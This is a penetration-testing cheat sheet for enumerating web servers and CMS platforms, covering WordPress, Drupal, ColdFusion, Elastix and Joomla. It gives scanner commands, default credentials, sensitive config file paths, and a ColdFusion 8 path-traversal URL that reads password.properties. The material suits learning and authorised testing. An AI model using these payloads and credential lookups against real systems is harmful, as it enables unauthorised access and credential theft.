# HTTP/HTTPS Enumeration
 >Tips and tricks for proeoperly enumerating a web server. The attack surface for this topic is most likely the largest for any protocol so it is well worth your time to slow down and make sure all of your bases are covered when a web server is identified. 
 

## Content Management Systems
- sometimes websites will use a CMS to make website management easier
- make sure to enumerate version info as these have been riddled with high impact vulns
	- google any version numbers of anything related to the CMS (plugins, themes, etc.)
- most come with a default login page 
	- check for defautl creds enabled there

### WordPress
-------
- most common CMS in existence

#### Checklist of items for Wordpress
- [ ] are admin pages default?
- [ ] are config pages available? 
- [ ] what plugins, themes, etc. are installed- are they vulnerable? 
- [ ] what users are on the installation?
- [ ] If it's a blog, has a blog section or enables comments- is there IDOR to find users?
	- [ ] /?author=1 -> /?author=2 

##### Wpscan 
- make sure to get free API key set up for best results: 
	- [WPScan API sign up](https://wpscan.com)
- run the scan: 
	- ```wpscan --url https://[domain] --stealthy --enumerate --plugins-detection --api-token [api-token-here] --output wordpress-scan.txt```
	- may need to use the ```--disable-tls-checks``` if the website is only available over HTTP 

##### Zoom
- slightly better username enumeration
	- ```python zoom.py -u https://[site]/```

###### WP login/admin pages
- /wp-admin
- /wp-login

###### Interesting config files
- setup-config.php
- wp-config.php

### Drupal
-------
- second most common CMS 

##### Droopescan
- this one can take a little bit to run but is the gold standard for enumerating drupal
	- ```droopescan scan drupal -u https://[ip]/ -t 16```

- /CHANGELOG.txt -> version info

### Cold Fusion
----
- check default webservice for version info
	- /CFIDE/adminapi/base.cfc?wsdl

- Version 8 has default LFI
	- ```http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en```

- Scan for CVE 2010-2861
	- ```nmap -vv -p80,443 --script=http-vuln-cve2010-2861 [ip]```

### Elastix
----
- default login creds -> admin:admin 
	- located at: /vtigercrm/
- profile image was vulnerable to web/revshell upload for a long time

### Joomla 
----
- default admin page at: /administrator
- useful config files: 
	- /configuration.php
	- /diagnostics.php
	- /joomla.inc.php
	- /config.inc.php






